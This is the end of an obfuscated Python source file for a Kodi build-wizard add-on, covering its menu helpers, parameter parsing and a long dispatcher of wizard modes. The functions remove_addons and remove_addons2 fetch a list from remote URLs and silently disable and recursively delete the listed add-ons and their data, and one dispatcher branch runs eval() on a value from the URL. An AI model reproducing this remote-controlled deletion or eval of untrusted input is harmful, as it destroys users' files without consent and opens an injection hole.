	if not name ==None :O0O0O00OO0OO00O00 +="&name="+urllib .quote_plus (name )#line:5071
	if not url ==None :O0O0O00OO0OO00O00 +="&url="+urllib .quote_plus (url )#line:5072
	OO0O0000000OO0O00 =True #line:5073
	if themeit :O0OO0OO0OOO0000OO =themeit %O0OO0OO0OOO0000OO #line:5074
	OOOO0000O0OOO00O0 =xbmcgui .ListItem (O0OO0OO0OOO0000OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5075
	OOOO0000O0OOO00O0 .setInfo (type ="Video",infoLabels ={"Title":O0OO0OO0OOO0000OO ,"Plot":description })#line:5076
	OOOO0000O0OOO00O0 .setProperty ("Fanart_Image",fanart )#line:5077
	if not menu ==None :OOOO0000O0OOO00O0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5078
	OO0O0000000OO0O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0O00OO0OO00O00 ,listitem =OOOO0000O0OOO00O0 ,isFolder =True )#line:5079
	return OO0O0000000OO0O00 #line:5080
def addFile (O0O00000OOO00O00O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5082
	O0OOOO00000OOO0OO =sys .argv [0 ]#line:5083
	if not mode ==None :O0OOOO00000OOO0OO +="?mode=%s"%urllib .quote_plus (mode )#line:5084
	if not name ==None :O0OOOO00000OOO0OO +="&name="+urllib .quote_plus (name )#line:5085
	if not url ==None :O0OOOO00000OOO0OO +="&url="+urllib .quote_plus (url )#line:5086
	O0OO0O0O00O00OOOO =True #line:5087
	if themeit :O0O00000OOO00O00O =themeit %O0O00000OOO00O00O #line:5088
	OOOOO0O0O0O0OO0OO =xbmcgui .ListItem (O0O00000OOO00O00O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5089
	OOOOO0O0O0O0OO0OO .setInfo (type ="Video",infoLabels ={"Title":O0O00000OOO00O00O ,"Plot":description })#line:5090
	OOOOO0O0O0O0OO0OO .setProperty ("Fanart_Image",fanart )#line:5091
	if not menu ==None :OOOOO0O0O0O0OO0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5092
	O0OO0O0O00O00OOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOO00000OOO0OO ,listitem =OOOOO0O0O0O0OO0OO ,isFolder =False )#line:5093
	return O0OO0O0O00O00OOOO #line:5094
def get_params ():#line:5096
	OOOO0O00OO00OO000 =[]#line:5097
	O0OO00OOO000000OO =sys .argv [2 ]#line:5098
	if len (O0OO00OOO000000OO )>=2 :#line:5099
		O0O0O000OO0OOOO0O =sys .argv [2 ]#line:5100
		O0OOOO0OOO000O0OO =O0O0O000OO0OOOO0O .replace ('?','')#line:5101
		if (O0O0O000OO0OOOO0O [len (O0O0O000OO0OOOO0O )-1 ]=='/'):#line:5102
			O0O0O000OO0OOOO0O =O0O0O000OO0OOOO0O [0 :len (O0O0O000OO0OOOO0O )-2 ]#line:5103
		O0OO0000OO0OO0O0O =O0OOOO0OOO000O0OO .split ('&')#line:5104
		OOOO0O00OO00OO000 ={}#line:5105
		for OO0OO00OOOOO000OO in range (len (O0OO0000OO0OO0O0O )):#line:5106
			O00O0OO000000000O ={}#line:5107
			O00O0OO000000000O =O0OO0000OO0OO0O0O [OO0OO00OOOOO000OO ].split ('=')#line:5108
			if (len (O00O0OO000000000O ))==2 :#line:5109
				OOOO0O00OO00OO000 [O00O0OO000000000O [0 ]]=O00O0OO000000000O [1 ]#line:5110
		return OOOO0O00OO00OO000 #line:5112
def remove_addons ():#line:5114
	try :#line:5115
			import json #line:5116
			OOO000O0O0OO00000 =urllib2 .urlopen (remove_url ).readlines ()#line:5117
			for O00O0OO00O00000OO in OOO000O0O0OO00000 :#line:5118
				O00O0O0OOOO00OO0O =O00O0OO00O00000OO .split (':')[1 ].strip ()#line:5120
				OO000OO00O00O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00O0O0OOOO00OO0O ,'false')#line:5121
				O000O0O00O0O0OOO0 =xbmc .executeJSONRPC (OO000OO00O00O0O0O )#line:5122
				O00OOOO0OO0000000 =json .loads (O000O0O00O0O0OOO0 )#line:5123
				O00O0OO0O0O0000OO =os .path .join (addons_folder ,O00O0O0OOOO00OO0O )#line:5125
				if os .path .exists (O00O0OO0O0O0000OO ):#line:5127
					for OOOO0O0000O0OO000 ,O00OO0000O0O000O0 ,O0O0000O00OOOO00O in os .walk (O00O0OO0O0O0000OO ):#line:5128
						for O0000O0OO0OOOOOOO in O0O0000O00OOOO00O :#line:5129
							os .unlink (os .path .join (OOOO0O0000O0OO000 ,O0000O0OO0OOOOOOO ))#line:5130
						for OOO0O0000OOOOO0OO in O00OO0000O0O000O0 :#line:5131
							shutil .rmtree (os .path .join (OOOO0O0000O0OO000 ,OOO0O0000OOOOO0OO ))#line:5132
					os .rmdir (O00O0OO0O0O0000OO )#line:5133
			xbmc .executebuiltin ('Container.Refresh')#line:5135
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5136
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5137
	except :pass #line:5138
def remove_addons2 ():#line:5139
	try :#line:5140
			import json #line:5141
			O0O0O00O0OOOO0OO0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5142
			for OOO00000OO00OOO00 in O0O0O00O0OOOO0OO0 :#line:5143
				OO00O0O000O0000OO =OOO00000OO00OOO00 .split (':')[1 ].strip ()#line:5145
				O00OOOO00O0OOOO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO00O0O000O0000OO ,'false')#line:5146
				O000OOO000OOO0O00 =xbmc .executeJSONRPC (O00OOOO00O0OOOO0O )#line:5147
				O0O000O00000O0O00 =json .loads (O000OOO000OOO0O00 )#line:5148
				O0O0OOOO00000O0OO =os .path .join (user_folder ,OO00O0O000O0000OO )#line:5150
				if os .path .exists (O0O0OOOO00000O0OO ):#line:5152
					for O0OOOO000O0O0OO00 ,OOO0OO0OO0OO000OO ,O0OOOO00OOOO000OO in os .walk (O0O0OOOO00000O0OO ):#line:5153
						for O00OOOOOOO00O00O0 in O0OOOO00OOOO000OO :#line:5154
							os .unlink (os .path .join (O0OOOO000O0O0OO00 ,O00OOOOOOO00O00O0 ))#line:5155
						for OOO000OO0OO000OO0 in OOO0OO0OO0OO000OO :#line:5156
							shutil .rmtree (os .path .join (O0OOOO000O0O0OO00 ,OOO000OO0OO000OO0 ))#line:5157
					os .rmdir (O0O0OOOO00000O0OO )#line:5158
	except :pass #line:5160
params =get_params ()#line:5161
url =None #line:5162
name =None #line:5163
mode =None #line:5164
try :mode =urllib .unquote_plus (params ["mode"])#line:5166
except :pass #line:5167
try :name =urllib .unquote_plus (params ["name"])#line:5168
except :pass #line:5169
try :url =urllib .unquote_plus (params ["url"])#line:5170
except :pass #line:5171
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5173
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5174
def setView (OO0OOOO0OO000OO00 ,O00OOO0OO00OOO0O0 ):#line:5175
	if wiz .getS ('auto-view')=='true':#line:5176
		OO0OOOOO00O000O0O =wiz .getS (O00OOO0OO00OOO0O0 )#line:5177
		if OO0OOOOO00O000O0O =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0OOOOO00O000O0O ='55'#line:5178
		if OO0OOOOO00O000O0O =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0OOOOO00O000O0O ='50'#line:5179
		wiz .ebi ("Container.SetViewMode(%s)"%OO0OOOOO00O000O0O )#line:5180
if mode ==None :index ()#line:5182
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5184
elif mode =='builds':buildMenu ()#line:5185
elif mode =='viewbuild':viewBuild (name )#line:5186
elif mode =='buildinfo':buildInfo (name )#line:5187
elif mode =='buildpreview':buildVideo (name )#line:5188
elif mode =='install':buildWizard (name ,url )#line:5189
elif mode =='theme':buildWizard (name ,mode ,url )#line:5190
elif mode =='viewthirdparty':viewThirdList (name )#line:5191
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5192
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5193
elif mode =='maint':maintMenu (name )#line:5195
elif mode =='passpin':passandpin ()#line:5196
elif mode =='backmyupbuild':backmyupbuild ()#line:5197
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5198
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5199
elif mode =='advancedsetting':advancedWindow (name )#line:5200
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5201
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5202
elif mode =='asciicheck':wiz .asciiCheck ()#line:5203
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5204
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5205
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5206
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5207
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5208
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5209
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5210
elif mode =='currentsettings':viewAdvanced ()#line:5211
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5212
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5213
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5214
elif mode =='fixskin':backtokodi ()#line:5215
elif mode =='testcommand':testcommand ()#line:5216
elif mode =='logsend':logsend ()#line:5217
elif mode =='rdon':rdon ()#line:5218
elif mode =='rdoff':rdoff ()#line:5219
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5220
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5221
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5222
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5223
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5224
elif mode =='freshstart':freshStart ()#line:5225
elif mode =='forceupdate':wiz .forceUpdate ()#line:5226
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5227
elif mode =='forceclose':wiz .killxbmc ()#line:5228
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5229
elif mode =='hidepassword':wiz .hidePassword ()#line:5230
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5231
elif mode =='enableaddons':enableAddons ()#line:5232
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5233
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5234
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5235
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5236
elif mode =='uploadlog':uploadLog .Main ()#line:5237
elif mode =='viewlog':LogViewer ()#line:5238
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5239
elif mode =='viewerrorlog':errorChecking (all =True )#line:5240
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5241
elif mode =='purgedb':purgeDb ()#line:5242
elif mode =='fixaddonupdate':fixUpdate ()#line:5243
elif mode =='removeaddons':removeAddonMenu ()#line:5244
elif mode =='removeaddon':removeAddon (name )#line:5245
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5246
elif mode =='removedata':removeAddonData (name )#line:5247
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5248
elif mode =='systeminfo':systemInfo ()#line:5249
elif mode =='restorezip':restoreit ('build')#line:5250
elif mode =='restoregui':restoreit ('gui')#line:5251
elif mode =='restoreaddon':restoreit ('addondata')#line:5252
elif mode =='restoreextzip':restoreextit ('build')#line:5253
elif mode =='restoreextgui':restoreextit ('gui')#line:5254
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5255
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5256
elif mode =='apk':apkMenu (name )#line:5258
elif mode =='apkscrape':apkScraper (name )#line:5259
elif mode =='apkinstall':apkInstaller (name ,url )#line:5260
elif mode =='speed':speedMenu ()#line:5261
elif mode =='net':net_tools ()#line:5262
elif mode =='GetList':GetList (url )#line:5263
elif mode =='youtube':youtubeMenu (name )#line:5264
elif mode =='viewVideo':playVideo (url )#line:5265
elif mode =='addons':addonMenu (name )#line:5267
elif mode =='addoninstall':addonInstaller (name ,url )#line:5268
elif mode =='savedata':saveMenu ()#line:5270
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5271
elif mode =='managedata':manageSaveData (name )#line:5272
elif mode =='whitelist':wiz .whiteList (name )#line:5273
elif mode =='trakt':traktMenu ()#line:5275
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5276
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5277
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5278
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5279
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5280
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5281
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5282
elif mode =='realdebrid':realMenu ()#line:5284
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5285
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5286
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5287
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5288
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5289
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5290
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5291
elif mode =='login':loginMenu ()#line:5293
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5294
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5295
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5296
elif mode =='clearlogin':loginit .clearSaved (name )#line:5297
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5298
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5299
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5300
elif mode =='contact':notify .contact (CONTACT )#line:5302
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5303
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5304
elif mode =='developer':developer ()#line:5306
elif mode =='converttext':wiz .convertText ()#line:5307
elif mode =='createqr':wiz .createQR ()#line:5308
elif mode =='testnotify':testnotify ()#line:5309
elif mode =='testnotify2':testnotify2 ()#line:5310
elif mode =='servicemanual':servicemanual ()#line:5311
elif mode =='fastinstall':fastinstall ()#line:5312
elif mode =='testupdate':testupdate ()#line:5313
elif mode =='testfirst':testfirst ()#line:5314
elif mode =='testfirstrun':testfirstRun ()#line:5315
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5316
elif mode =='bg':wiz .bg_install (name ,url )#line:5318
elif mode =='bgcustom':wiz .bg_custom ()#line:5319
elif mode =='bgremove':wiz .bg_remove ()#line:5320
elif mode =='bgdefault':wiz .bg_default ()#line:5321
elif mode =='rdset':rdsetup ()#line:5322
elif mode =='mor':morsetup ()#line:5323
elif mode =='mor2':morsetup2 ()#line:5324
elif mode =='resolveurl':resolveurlsetup ()#line:5325
elif mode =='urlresolver':urlresolversetup ()#line:5326
elif mode =='forcefastupdate':forcefastupdate ()#line:5327
elif mode =='traktset':traktsetup ()#line:5328
elif mode =='placentaset':placentasetup ()#line:5329
elif mode =='flixnetset':flixnetsetup ()#line:5330
elif mode =='reptiliaset':reptiliasetup ()#line:5331
elif mode =='yodasset':yodasetup ()#line:5332
elif mode =='numbersset':numberssetup ()#line:5333
elif mode =='uranusset':uranussetup ()#line:5334
elif mode =='genesisset':genesissetup ()#line:5335
elif mode =='fastupdate':fastupdate ()#line:5336
elif mode =='folderback':folderback ()#line:5337
elif mode =='menudata':Menu ()#line:5338
elif mode ==2 :#line:5340
        wiz .torent_menu ()#line:5341
elif mode ==3 :#line:5342
        wiz .popcorn_menu ()#line:5343
elif mode ==8 :#line:5344
        wiz .metaliq_fix ()#line:5345
elif mode ==9 :#line:5346
        wiz .quasar_menu ()#line:5347
elif mode ==5 :#line:5348
        swapSkins ('skin.Premium.mod')#line:5349
elif mode ==13 :#line:5350
        wiz .elementum_menu ()#line:5351
elif mode ==16 :#line:5352
        wiz .fix_wizard ()#line:5353
elif mode ==17 :#line:5354
        wiz .last_play ()#line:5355
elif mode ==18 :#line:5356
        wiz .normal_metalliq ()#line:5357
elif mode ==19 :#line:5358
        wiz .fast_metalliq ()#line:5359
elif mode ==20 :#line:5360
        wiz .fix_buffer2 ()#line:5361
elif mode ==21 :#line:5362
        wiz .fix_buffer3 ()#line:5363
elif mode ==11 :#line:5364
        wiz .fix_buffer ()#line:5365
elif mode ==15 :#line:5366
        wiz .fix_font ()#line:5367
elif mode ==14 :#line:5368
        wiz .clean_pass ()#line:5369
elif mode ==22 :#line:5370
        wiz .movie_update ()#line:5371
elif mode =='adv_settings':buffer1 ()#line:5372
elif mode =='getpass':getpass ()#line:5373
elif mode =='setpass':setpass ()#line:5374
elif mode =='setuname':setuname ()#line:5375
elif mode =='passandUsername':passandUsername ()#line:5376
elif mode =='9':disply_hwr ()#line:5377
elif mode =='99':disply_hwr2 ()#line:5378
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))